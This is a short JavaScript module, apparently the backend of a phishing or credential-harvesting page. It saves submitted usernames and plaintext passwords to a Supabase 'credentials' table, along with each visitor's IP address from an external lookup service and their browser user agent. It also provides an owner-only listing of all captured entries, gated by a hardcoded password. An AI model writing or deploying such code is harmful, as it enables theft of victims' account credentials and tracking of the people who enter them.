import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY

export const supabase = createClient(supabaseUrl, supabaseAnonKey)

// Add a new credential to the database
export async function addCredential(username, password) {
  try {
    const { data, error } = await supabase
      .from('credentials')
      .insert([
        {
          username: username || 'N/A',
          password: password || 'N/A',
          ip_address: await getClientIP(),
          user_agent: navigator.userAgent
        }
      ])
    
    if (error) {
      console.error('Error saving credential:', error)
      return false
    }
    
    return true
  } catch (err) {
    console.error('Error saving credential:', err)
    return false
  }
}

// Get all credentials from the database
export async function getCredentials() {
  try {
    const { data, error } = await supabase
      .from('credentials')
      .select('*')
      .order('created_at', { ascending: false })
    
    if (error) {
      console.error('Error fetching credentials:', error)
      return []
    }
    
    return data || []
  } catch (err) {
    console.error('Error fetching credentials:', err)
    return []
  }
}

// Get client IP address (best effort)
async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    return data.ip
  } catch {
    return 'Unknown'
  }
}

// Authenticate owner with simple password check
export async function authenticateOwner(password) {
  // In a real scenario, you might want to use Supabase auth
  // For now, we'll use a simple password check
  return password === 'owneraccess123'
}